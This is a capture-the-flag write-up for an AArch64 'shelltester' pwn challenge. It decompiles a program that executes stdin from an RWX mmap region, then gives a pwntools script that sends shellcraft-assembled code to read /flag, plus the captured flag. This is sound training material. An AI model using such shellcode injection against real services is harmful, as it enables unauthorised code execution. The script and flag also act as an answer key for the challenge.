## Name: shelltester
#### Category: pwn
#### Difficulty: N/A
#### Description: Test your shellcode in my safe program!

## Procedure
Running the file command I got the following output:
```
chal: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), statically linked, for GNU/Linux 3.7.0, BuildID[sha1]=ac8719a3c404a9f58dbf984c24d41ccbcf0b12d8, not stripped
```
You can see that the binary is for the ARM architecture (64-bit), also known as ARMv8-A or AArch64, this is very important for our payload. And we have the following files:

```
.
├── Dockerfile
├── chal
├── flag
├── nsjail.cfg
└── qemu-aarch64-static
```

Running the ```qemu-aarch64-static``` binary with ```chal``` we can see the following output:

```
./qemu-aarch64-static chal
Welcome to my shellcode tester!

This time in a different architecture
Just give me a shellcode and I will run it in a safe place!

```
## main() function Content from chal 
Using Ghidra, we recover the main function code:
1) ```mmap64``` function is used to allocate a memory region of size 1000 bytes
2) ```PROT_READ | PROT_WRITE | PROT_EXEC (7)```, this allows the memory to be readable, writable, and executable, which is dangerous because it enables arbitrary code execution.
3) The ```read(0, __buf, 1000)``` call reads up to 1000 bytes of input from standard input (stdin) and stores it in the memory region allocated by ```mmap64```, this effectively allows us to provide our custom shellcode.

```
  code *__buf;
  
  init(param_1);
  puts("Welcome to my shellcode tester!\n");
  puts("This time in a different architecture");
  puts("Just give me a shellcode and I will run it in a safe place!");
  __buf = (code *)mmap64((void *)0x0,1000,7,0x22,-1,0);
  read(0,__buf,1000);
  (*__buf)();
  return 0;
```

From here we dont need to do a bufferoverflow or something like that, because our shellcode will be executed directly, we just need to send it using the correct arch ```aarch64```

I wrote the following python script

```
from pwn import *


context.arch = 'aarch64'
qemu_path = 'qemu-aarch64-static'
#p = process([qemu_path, './chal'])
p = remote('shelltester.challs.csc.tf',1337)

shellcode = shellcraft.cat("/flag")
payload = asm(shellcode)

#print("shellcode",shellcode)
#print("payload",payload)

p.sendline(payload)
print(p.recv(1024))
p.interactive()
```

flag ```CSCTF{34sy_Sh3llcod3_w1th_pwnt00ls}```
